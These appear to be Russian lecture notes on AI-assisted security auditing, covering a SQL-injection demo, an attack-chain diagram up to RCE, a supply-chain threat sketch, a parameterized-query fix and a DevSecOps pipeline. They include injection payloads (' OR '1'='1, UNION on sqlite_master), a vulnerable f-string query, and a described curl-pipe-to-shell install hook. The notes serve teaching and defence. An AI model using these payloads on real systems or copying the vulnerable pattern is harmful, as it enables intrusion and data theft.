## 1. 🎮 «Хакер наоборот» — сколько времени нужно ИИ, чтобы найти дыру

### Идея
Таймер на слайде. Зал угадывает: сколько секунд ИИ потратит на поиск уязвимости в коде?
→ Реальный ответ: **< 10 секунд** (промпт → ответ с CWE-89 за пару секунд).

### Слайд: «Угадай, сколько длится аудит безопасности?»
| Кто | Время |
|-----|-------|
| Ручной code review, 2 файла | 5–15 минут |
| Сканер (bandit) | < 1 минуты |
| **ИИ (промпт «найди уязвимости»)** | **~10 секунд** |

### Живое демо (в классе)
1. Покажи код `/search` с f-string (2 строки).
2. Люди гадают вслух.
3. Вставь промпт из `PROMPTS.md` п.1 в LLM на экране.
4. Таймер реально показывает 5–10 секунд до ответа с «SQL-инъекция CWE-89».

### Вывод для слайда
> Разрыв «минуты vs секунды» — главный аргумент: ручной аудит не поспевает за скоростью ИИ-атаки.

## 3. 🧨 Цепочка: от LIKE-инъекции до RCE (диаграмма)

### Идея
Показать, как «безобидная» SQL-инъекция в поиске превращается в полный компромисс.

### Диаграмма (as Mermaid-код для render)
```
[SQL-инъекция в /search?q=]
        │
        ▼
  1. Обход фильтра ....... ' OR '1'='1  → все строки
        │
        ▼
  2. UNION-эксфильтрация ... читаем sqlite_master → знаем схему
        │
        ▼
  3. Читаем ЧУЖИЕ таблицы (users, tokens) → утечка PII/креды
        │
        ▼
  4. Пишем в БД / много-statement (в др. БД) → модификация данных
        │
        ▼
  5. [если БД/приложение позволяют] читаем файлы → ключи/конфиги
        │
        ▼
  6. [RCE через SQL функции / DESERIALIZE] → шелл на сервере
```

### Слайд-тезисы
- В нашем SQLite-полигоне доходим до шага 3 (схема + данные) — уже критично.
- Шаги 5–6 требуют других БД/фич, но это **стандартная** эскалация.
- Вывод: **никакая «маленькая» дыра не изолирована** — это вход в цепочку.

### Артефакт для репо
- `lecture/diagram_attack_chain.md` — Mermaid-диаграмма (встраивается в reveal.js/Marp).
- `screenshots/02_sqli_union_schema.png` — живое подтверждение шага 2.

## 4. 📦 Supply-chain демо: «безобидный» пакет

### Идея
Показать, что `pip install` доверенного-на-вид пакета может выполнить вредоносный код.

### Как показать (учебный пакет, локальный)
Мы НЕ публикуем вредоносный пакет. Вместо этого — **разбираем механизм на визуалах**:

1. Слайд «Сколько зависимостей у pip install fastapi?» → `pip-audit` показывает реальный граф.
2. Показываем, как ИИ читает вывод `pip-audit` (PROMPTS.md п.4): что системное, что из кода.
3. **Моделируем угрозу словами** (без реального пакета):
   - злоумышленник публикует пакет с красивым именем (`fastapi-utils`, `jwt-helpers`),
   - в `setup.py`/`__init__.py` — `os.system('curl ... | sh')` на `import`,
   - жертва ставит его → код подтягивается/крадёт токены.
4. **Демонстрация механизма (безопасно):** создаём локальный пакет с `print + open('/tmp/proof.txt','w')` в `__init__.py`, ставим `pip install -e .`, показываем, что файл создался при импорте.

### Проверенный факт (наш аудит)
pip-audit нашёл уязвимости в setuptools/urllib3/twisted — системные пакеты. Зависимости проекта чисты. Это показывает: **важно разделять системные и проектные зависимости** при оценке риска.

### Вывод для слайда
> `pip install` — это выполнение чужого кода. Доверяй, но проверяй: `pip-audit`, `pip check`, pin версий, `--require-hashes`.

## 5. 🔧 «Фикс за 1 минуту» — параметризация закрывает SQLi

### Идея
Тот же `/search`, но с параметризованным запросом → повторный фаззер → **0 находок**.
Самый убедительный «было/стало» слайд.

### Было (уязвимо)
```python
def search_items(q: str):
    sql = f"SELECT * FROM items WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'"
    return conn.execute(sql).fetchall()
```

### Стало (безопасно)
```python
def search_items(q: str):
    like = f"%{q}%"
    with get_db() as conn:
        cur = conn.execute(
            "SELECT * FROM items WHERE name LIKE ? OR description LIKE ?",
            (like, like),
        )
        return [row_to_dict(r) for r in cur.fetchall()]
```

### Проверка (скрипт)
```bash
# на уязвимой версии:
python3 lecture/demo_ai_fuzz.py --target http://127.0.0.1:8000
# → sql OR 1=1 / UNION / DELETE → 🔴 500

# на исправленной (README branch fix/sqli):
python3 lecture/demo_ai_fuzz.py --target http://127.0.0.1:8000
# → sql OR 1=1 → 200, только свои данные (без утечки), нет 500
```

### Артефакты
- Ветка `fix/sql-injection` (в репо) — исправленный `search_items`.
- README ветки: как применить фикс и перепроверить.

## 6. ⚙️ DevSecOps-пайплайн: где ИИ встраивается в CI

### Идея
Схема, как безопасность встраивается в доставку, и где LLM усиливает каждый этап.

### Пайплайн (схема)
```
[commit] → [SAST] → [Dependency scan] → [DAST] → [LLM-review] → [gates] → [deploy]
              │            │               │            │
              ▼            ▼               ▼            ▼
          bandit/     pip-audit/      OWASP ZAP/    «объясни, 
          semgrep     trivy          nuclei        приоритизируй, 
                                                   предложи фикс»
```

### Роль ИИ на каждом этапе
| Этап | Традиционно | + ИИ |
|------|-------------|------|
| SAST (bandit/semgrep) | сырой список правил | LLM объясняет каждое, показывает строку, даёт фикс |
| Dependency scan | список CVE | LLM отделяет достижимые от системных |
| DAST (ZAP) | кипа алертов | LLM приоритизирует по severity и реальной достижимости |
| Review | человек читает diff | LLM-ревьювер как первый проход, человек — финальный |
| Gates | fail on high | LLM пишет rationale, защищает/оспаривает блок |

### Вывод
> LLM не заменяет SAST/DAST, а делает их вывод **понятным и приоритизированным** — снижает шум, ускоряет реакцию.

## 7. 🏅 Security Champions — безопасность как культура

### Концепция
Безопасность — не один «сейфти-человек» в конце пайплайна, а компетенция каждого инженера.

### Слайд-принципы
1. **Каждый dev умеет** прогнать `bandit` + `demo_ai_fuzz.py` на своём коде перед MR. (Мы это делаем за минуты!)
2. **Security Champions** — добровольцы в каждой команде, связывают dev и security.
3. **Ранняя проверка дешевле** — найти дыру до деплоя стоит копейки, после — миллионы и репутацию.
4. **ИИ = усилитель культуры** — делает аудит доступным каждому, не только экспертам.

### Вывод
> Инструменты есть (бесплатные). Нужна привычка. Лекция — первый шаг.

## 8. 🧠 Пошаговое рассуждение ИИ — учим думать, а не доверять

### Идея
Вместо «ИИ магически угадал» — показать его **разбор**, чтобы студенты научились видеть дыры сами.

### Разбор SQLi (что ИИ объясняет)
1. `q` приходит от пользователя — untrusted.
2. Подставляется в SQL через f-string — буквально в строку запроса.
3. Атакующий передаёт `' OR '1'='1` → SQL становится `WHERE name LIKE '%' OR '1'='1%'` → всегда true.
4. UNION позволяет добавить свою SELECT → читаем любые таблицы.
5. Те же данные в `sqlite_master` → схема БД.
6. Фикс: параметризация — `?` привязано к значению, SQL-структура отделена от данных.

### Почему это ценно на лекции
- Учит **механике**, а не слепому копированию payload'ов.
- Студент сможет найти похожие дыры в своём коде самостоятельно.
- Показывает, что ИИ — не чёрный ящик, а мощный учитель.

## 9. ⚖️ Наивный vs грамотный промпт — качество аудита зависит от вопроса

### Идея
Один код, два промпта → разный результат. Показывает: ИИ силён, но надо уметь спросить.

### Плохой промпт (мало деталей)
> «Проверь код на безопасность.»
→ ИИ может дать общие слова: «используйте валидацию», без конкретики.

### Хороший промпт (контекст + требования)
> «Вот FastAPI-код. Найди все уязвимости. Для каждой: CWE, severity, строку кода, эксплойт, фикс. Не выдумывай — только то, что реально видишь.»
→ ИИ находит SQLi, XSS, 500-ки, CORS — с конкретикой.

### Слайд-сравнение
| | Наивный | Грамотный |
|--|---------|-----------|
| Результат | общие фразы | CWE + строка + эксплойт |
| Стоимость | 0 пользы | actionable |
| Урок | **quality in → quality out** |

### Практический гайд (мини)
- Дай модели **контекст** (фреймворк, стек, фрагмент кода).
- Попроси **конкретный формат** (CWE, severity, строка).
- Ограничь **фантазии** («только то, что видишь»).
- Перепроверяй — ИИ иногда галлюцинирует.
